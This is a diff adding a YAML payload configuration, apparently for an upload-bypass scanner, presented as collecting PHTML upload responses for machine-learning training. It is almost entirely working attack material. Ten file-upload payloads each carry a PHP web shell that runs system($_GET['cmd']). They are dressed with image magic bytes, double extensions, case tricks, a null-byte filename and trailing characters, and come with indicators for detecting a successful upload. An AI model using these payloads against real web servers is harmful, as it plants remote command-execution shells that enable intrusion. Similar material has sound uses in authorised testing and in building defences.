@@ -1,0 +1,136 @@
+name: "PHTML Dataset Collection"
+description: "Collects PHTML upload responses for ML training"
+author: "HaakimSec"
+version: "2.0"
+tech_stack: "php"
+
+target:
+  endpoint: "/upload_unrestricted.php"
+  method: "POST"
+  param: "file"
+
+headers:
+  User-Agent: "GoUpload-ML-Dataset/1.0"
+
+form_data:
+  upload: "1"
+
+payloads:
+  # Direct PHTML uploads
+  - name: "Direct PHTML Upload"
+    filename: "shell.phtml"
+    extension: ".phtml"
+    content_type: "application/x-php"
+    body: |
+      <?php echo "PHTML_RCE_MARKER"; system($_GET["cmd"]); ?>
+    tags:
+      - "phtml"
+      - "direct"
+      - "rce"
+
+  # PHTML with GIF magic bytes (bypass)
+  - name: "PHTML with GIF magic"
+    filename: "shell.gif.phtml"
+    extension: ".phtml"
+    content_type: "image/gif"
+    body: |
+      GIF89a<?php echo "PHTML_RCE_MARKER"; system($_GET["cmd"]); ?>
+    tags:
+      - "phtml"
+      - "magic-bytes"
+
+  # PHTML with PNG magic
+  - name: "PHTML with PNG magic"
+    filename: "shell.png.phtml"
+    extension: ".phtml"
+    content_type: "image/png"
+    body: |
+      PNG<?php echo "PHTML_RCE_MARKER"; system($_GET["cmd"]); ?>
+    tags:
+      - "phtml"
+      - "magic-bytes"
+
+  # Double extension: .phtml.jpg
+  - name: "PHTML double extension"
+    filename: "shell.phtml.jpg"
+    extension: ".jpg"
+    content_type: "image/jpeg"
+    body: |
+      <?php echo "PHTML_RCE_MARKER"; system($_GET["cmd"]); ?>
+    tags:
+      - "phtml"
+      - "double-extension"
+
+  # Reverse double extension
+  - name: "PHTML reverse double"
+    filename: "shell.jpg.phtml"
+    extension: ".phtml"
+    content_type: "image/jpeg"
+    body: |
+      <?php echo "PHTML_RCE_MARKER"; system($_GET["cmd"]); ?>
+    tags:
+      - "phtml"
+      - "double-extension"
+
+  # Case variations
+  - name: "PHTML uppercase"
+    filename: "shell.PHTML"
+    extension: ".PHTML"
+    content_type: "application/x-php"
+    body: |
+      <?php echo "PHTML_RCE_MARKER"; system($_GET["cmd"]); ?>
+    tags:
+      - "phtml"
+      - "case-sensitivity"
+
+  - name: "PHTML mixed case"
+    filename: "shell.PhTmL"
+    extension: ".PhTmL"
+    content_type: "application/x-php"
+    body: |
+      <?php echo "PHTML_RCE_MARKER"; system($_GET["cmd"]); ?>
+    tags:
+      - "phtml"
+      - "case-sensitivity"
+
+  # Null byte variations
+  - name: "PHTML with null byte"
+    filename: "shell.phtml%00.jpg"
+    extension: ".jpg"
+    content_type: "image/jpeg"
+    body: |
+      <?php echo "PHTML_RCE_MARKER"; system($_GET["cmd"]); ?>
+    tags:
+      - "phtml"
+      - "null-byte"
+
+  # Trailing characters
+  - name: "PHTML with trailing space"
+    filename: "shell.phtml "
+    extension: ".phtml"
+    content_type: "application/x-php"
+    body: |
+      <?php echo "PHTML_RCE_MARKER"; system($_GET["cmd"]); ?>
+    tags:
+      - "phtml"
+      - "trailing-space"
+
+  - name: "PHTML with trailing dot"
+    filename: "shell.phtml."
+    extension: ".phtml"
+    content_type: "application/x-php"
+    body: |
+      <?php echo "PHTML_RCE_MARKER"; system($_GET["cmd"]); ?>
+    tags:
+      - "phtml"
+      - "trailing-dot"
+
+success_indicators:
+  - "File uploaded successfully"
+  - "Target file:"
+  - "uploads/"
+
+failure_indicators:
+  - "not allowed"
+  - "Error:"
+  - "rejected"
